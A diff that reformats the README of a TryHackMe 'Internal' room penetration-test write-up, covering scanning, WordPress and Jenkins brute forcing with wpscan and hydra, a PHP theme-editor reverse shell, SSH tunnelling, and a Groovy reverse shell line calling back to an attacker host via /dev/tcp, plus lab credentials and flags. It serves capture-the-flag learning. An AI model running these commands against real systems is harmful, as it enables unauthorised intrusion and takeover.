@@ -1,23 +1,23 @@
 TryHackMe Internal Room — Complete Penetration Test Report
 A documented end-to-end exploitation of the TryHackMe "Internal" room, covering reconnaissance through privilege escalation.
 
-## Overview
-
+Overview 
+-----------
 This repository contains a complete walkthrough of a multi-stage internal network penetration test. The target exposes a WordPress installation vulnerable to credential enumeration and theme file manipulation, leading to remote code execution. Lateral movement via SSH tunneling and Jenkins exploitation results in root access.
 
-**Attack Chain:** Nmap → Dirsearch → WPScan → RCE Shell → Lateral Movement (aubreanna) → SSH Tunnel → Jenkins Compromise → Root Access
+Attack Chain: Nmap → Dirsearch → WPScan → RCE Shell → Lateral Movement (aubreanna) → SSH Tunnel → Jenkins Compromise → Root Access
 
-## Quick Facts
+ Quick Facts
+-------------
+- Target: Ubuntu 18.04 LTS (internal.thm)
+- Exposed Services: SSH (OpenSSH 7.6p1), HTTP (Apache 2.4.29)
+- Initial Entry: WordPress admin brute force via WPScan
+- RCE Method: PHP reverse shell via theme editor
+- Privilege Escalation: Jenkins script console (Groovy) running as root
 
-- **Target:** Ubuntu 18.04 LTS (internal.thm)
-- **Exposed Services:** SSH (OpenSSH 7.6p1), HTTP (Apache 2.4.29)
-- **Initial Entry:** WordPress admin brute force via WPScan
-- **RCE Method:** PHP reverse shell via theme editor
-- **Privilege Escalation:** Jenkins script console (Groovy) running as root
-
-## Exploitation Steps
-
-### 1. Reconnaissance
+ Exploitation Steps
+-------------------
+ ✹  Reconnaissance
 ```bash
 nmap -sV -p- <target_ip>
 # Result: SSH:22, HTTP:80
@@ -28,22 +28,22 @@ Add virtual host mapping to `/etc/hosts`:
 <target_ip> internal.thm
 ```
 
-### 2. Web Enumeration
+✹  Web Enumeration
 ```bash
 dirsearch -u http://internal.thm -w /usr/share/wordlists/dirb/common.txt
 # Discovers: /wordpress/wp-login.php
 ```
 
-### 3. WordPress Credential Attack
+✹ WordPress Credential Attack
 ```bash
 wpscan --url http://internal.thm/wordpress --enumerate u
 wpscan --url http://internal.thm/wordpress -U admin -P /usr/share/wordlists/rockyou.txt
 # Credentials: admin:my2boys
 ```
 
-### 4. Remote Code Execution
+✹ Remote Code Execution
 - Login to WordPress admin dashboard
-- Navigate to **Appearance → Theme Editor**
+- Navigate to **Appearance → Theme Editor
 - Select TwentySixteen/Seventeen theme
 - Edit `404.php` and inject PHP reverse shell
 - Remove PHP extension guard (if present)
@@ -54,7 +54,7 @@ Listener setup:
 nc -lvnp 4444
 ```
 
-### 5. Lateral Movement (www-data → aubreanna)
+✹ Lateral Movement (www-data → aubreanna)
 Credentials found in `/opt/wp-save.txt`:
 ```
 Username: aubreanna
@@ -67,9 +67,9 @@ python3 -c 'import pty; pty.spawn("/bin/bash")'
 su aubreanna
 ```
 
-**User Flag:** `/home/aubreanna/user.txt`
+✹ User Flag: `/home/aubreanna/user.txt`
 
-### 6. Jenkins Discovery & Tunneling
+✹ Jenkins Discovery & Tunneling
 Jenkins service runs internally on Docker subnet (172.17.0.2:8080), not directly accessible.
 
 SSH port forwarding:
@@ -78,14 +78,14 @@ ssh -L 1234:172.17.0.2:8080 aubreanna@<target_ip>
 # Access: http://127.0.0.1:1234
 ```
 
-### 7. Jenkins Exploitation
+✹ Jenkins Exploitation
 Brute force Jenkins login:
 ```bash
 hydra -l admin -P /usr/share/wordlists/rockyou.txt http://127.0.0.1:1234 http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid username or password"
 # Credentials: admin:spongebob
 ```
 
-### 8. Root Access
+✹ Root Access
 Access **Manage Jenkins → Script Console** and execute Groovy reverse shell:
 ```groovy
 String[] cmd = {"/bin/bash", "-c", "bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1"};
@@ -96,7 +96,8 @@ Script console executes as root inside Jenkins container.
 
 **Root Flag:** `/root/root.txt`
 
-## Key Vulnerabilities Exploited
+ Key Vulnerabilities Exploited
+------------------------------
 
 | Vulnerability | Impact | Severity |
 |---|---|---|
@@ -109,7 +110,8 @@ Script console executes as root inside Jenkins container.
 | Jenkins weak credentials | Full container compromise | High |
 | Jenkins script console as root | Host root access | Critical |
 
-## Tools Required
+Tools Required
+----------------
 
 - `nmap` — Port scanning and service detection
 - `dirsearch` — Directory enumeration
@@ -118,34 +120,27 @@ Script console executes as root inside Jenkins container.
 - `netcat` — Reverse shell listener
 - `ssh` — Port forwarding and lateral access
 
-## Files
-
+ Files
+-------
 - `WALKTHROUGH.pdf` — Complete visual walkthrough with screenshots
 - `flags.txt` — Both user and root flags
-- `NOTES.md` — Technical deep-dive and attack chain analysis
 
-## Flags
+Flags
+---------
+User: `THM{int3rna1_fl4g_1}`  
+Root: `THM{d0ck3r_d3str0y3r}`
 
-**User:** `THM{int3rna1_fl4g_1}`  
-**Root:** `THM{d0ck3r_d3str0y3r}`
+Lessons
+--------
+1. Weak credential hygiene — Default/common passwords enable rapid compromise
+2. WordPress administration — Theme editing should be disabled or heavily restricted
+3. Leftover credentials — Hardcoded credentials in accessible files are a critical risk
+4. Network segmentation failure — Internal services (Jenkins) lack isolation
+5. Privilege escalation risk — Services running as root with user-controlled input are game over
 
-## Lessons
-
-1. **Weak credential hygiene** — Default/common passwords enable rapid compromise
-2. **WordPress administration** — Theme editing should be disabled or heavily restricted
-3. **Leftover credentials** — Hardcoded credentials in accessible files are a critical risk
-4. **Network segmentation failure** — Internal services (Jenkins) lack isolation
-5. **Privilege escalation risk** — Services running as root with user-controlled input are game over
-
-## References
-
+ References
+-----------
 - [TryHackMe Internal Room](https://tryhackme.com/room/internal)
 - WPScan Documentation
 - Hydra Brute Force Guide
 - Jenkins Script Console Security
-
----
-
-**Status:** Complete  
-**Difficulty:** Medium  
-**Time to Complete:** ~2-3 hours
